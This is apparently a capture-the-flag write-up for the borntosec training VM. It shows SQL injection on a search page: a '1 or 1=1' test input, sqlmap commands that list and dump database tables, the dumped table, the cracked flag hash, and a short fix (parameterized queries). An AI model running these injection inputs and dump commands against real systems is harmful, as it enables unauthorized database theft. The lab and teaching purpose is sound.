# 01_Unsercure_Search_By_Id_SQLINJECTION

Unsecure sql request form in the page:
http://192.168.99.100/index.php?page=member

## How to see it

Go on the page mentionned before.
Whenever you are looking for an SQL injection you want to check if the page is injectable. You can either check this with sqlmap
or you can try to type an SQL request responding true everytime such like this one:
```bash
1 or 1=1
```
Whenever we type this one we realise that this page can be injected. This is a major security problem.

## How to abuse of it

We are going to use a tool which will help us to inject this sql. It is Sqlmap.
So we can basically print the list of the database that we are intersted in with this command:
```bash
sqlmap -u "http://192.168.99.100/?page=searchimg&id=1&Submit=Submit#" --tables
```
Then we can make a dump of the database we are interested in, so the user one:
```bash
sqlmap -u "http://192.168.99.100/?page=searchimg&id=1&Submit=Submit#" --dump -T list_images
```
And here we are now we can decrypt the password with the asked in the command request:
```bash
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
| id | url                              | title     | comment                                                                                                               |
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
| 1  | https://www.nsa.org/img.jpg      | Nsa       | An image about the NSA !                                                                                              |
| 2  | https://www.42.fr/42.png         | 42 !      | There is a number..                                                                                                   |
| 3  | https://www.google.fr/google.png | Google    | Google it !                                                                                                           |
| 4  | https://www.obama.org/obama.jpg  | Obama     | Yes we can !                                                                                                          |
| 5  | borntosec.ddns.net/images.png    | Hack me ? | If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 |
| 6  | https://www.h4x0r3.0rg/tr0ll.png | tr00l     | Because why not ?                                                                                                     |
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
```

```bash
1928e8083cf461a51303633093573c46 -> albatroz -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## How to patch it

Don't use dynamic SQL – don't construct queries with user input: Even data sanitization routines can be flawed.
So use prepared statements, parameterized queries or stored procedures instead whenever possible. ORM IS GOOD USE IT
